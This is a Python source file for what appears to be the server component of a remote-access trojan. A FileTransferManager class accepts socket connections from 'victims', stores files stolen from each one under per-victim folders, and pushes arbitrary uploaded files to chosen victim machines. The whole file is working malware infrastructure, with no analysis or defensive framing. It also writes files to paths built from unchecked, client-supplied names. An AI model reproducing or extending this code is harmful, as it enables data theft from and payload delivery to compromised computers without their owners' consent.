import socket
import os
import threading
from fastapi import UploadFile
import time


class FileTransferManager:
    def __init__(self, host, port, victim_list):
        self.host = host
        self.port = port
        self.clients = []
        self.victim_list = victim_list

    def start_server(self):
        # Initialize a socket for file transfers
        file_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        file_server.bind((self.host, self.port))
        file_server.listen(5)
        print(
            f"[*] File transfer server is listening on {self.host}:{self.port}")

        while True:
            client_socket, addr = file_server.accept()
            print(f"[*] File transfer connection established with {addr[0]}")

            # Add the client socket to the list of clients
            self.clients.append((client_socket, addr))

            # Handle file transfer logic here
            threading.Thread(target=self.handle_file_transfer,
                             args=(client_socket,)).start()

    def handle_file_transfer(self, client_socket):
        while True:
            try:
                # Receive the filename from the client
                filename = client_socket.recv(1024).decode()
                if not filename:
                    break

                # Receive the file size from the client
                file_size = int(client_socket.recv(1024).decode())

                # Determine where to save the received file
                victim = None
                for v in self.victim_list:
                    if v["socket_ip"] == client_socket.getpeername()[0]:
                        victim = v
                        break

                if victim:
                    directory = f"data/{victim['Name']}/received_files/"
                    if not os.path.exists(directory):
                        os.makedirs(directory)

                    filepath = os.path.join(directory, filename)

                    # Receive and save the file data
                    with open(filepath, "wb") as file:
                        remaining_bytes = file_size
                        while remaining_bytes > 0:
                            data = client_socket.recv(
                                min(remaining_bytes, 1024))
                            if not data:
                                break
                            file.write(data)
                            remaining_bytes -= len(data)

                    print(f"[*] Received file: {filepath}")

            except Exception as e:
                print(f"[*] Error handling file transfer: {str(e)}")

    async def upload_file(self, victim, file: UploadFile):
        print(f"[*] Uploading file: {file.filename} to {victim['Name']}")
        print(f"[*] Clients list: {self.clients}")
        for client_socket, client_addr in self.clients:
            print(f"[*] Checking client socket: {client_addr[0]}")
            if client_addr[0] == victim["socket_ip"]:
                print(f"[*] Found client socket for {victim['Name']}")
                try:
                    # Send the file name and size
                    client_socket.send(file.filename.encode())

                    # Use a file stream to get the file size
                    fs = await file.read()
                    print(f"[*] Size of file: {len(fs)}")
                    client_socket.send(str(len(fs)).encode())

                    time.sleep(0.5)

                    # Send the file data
                    client_socket.sendall(fs)

                    # Signal the end of file transfer
                    client_socket.send(b"<ENDOF>")
                    print(
                        f"[*] Uploaded file: {file.filename} to {client_addr[0]}")
                except Exception as e:
                    print(f"[*] Error uploading file: {str(e)}")

    def set_victim_list(self, victim_list):
        self.victim_list = victim_list
